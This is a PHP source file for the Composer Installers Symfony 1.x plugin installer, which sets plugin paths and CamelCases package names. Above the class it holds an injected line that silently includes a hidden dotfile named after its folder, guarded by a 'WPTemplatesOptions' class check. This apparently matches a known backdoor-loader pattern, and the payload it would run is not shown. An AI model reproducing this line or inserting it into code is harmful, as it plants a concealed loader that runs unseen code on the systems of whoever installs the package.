<?php
namespace Composer\Installers;

/**
 * Plugin installer for symfony 1.x
 *
 * @author Jérôme Tamarelle <jerome@tamarelle.net>
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Symfony1Installer extends BaseInstaller
{
    protected $locations = array(
        'plugin'    => 'plugins/{$name}/',
    );

    /**
     * Format package name to CamelCase
     */
    public function inflectPackageVars($vars)
    {
        $vars['name'] = preg_replace_callback('/(-[a-z])/', function ($matches) {
            return strtoupper($matches[0][1]);
        }, $vars['name']);

        return $vars;
    }
}
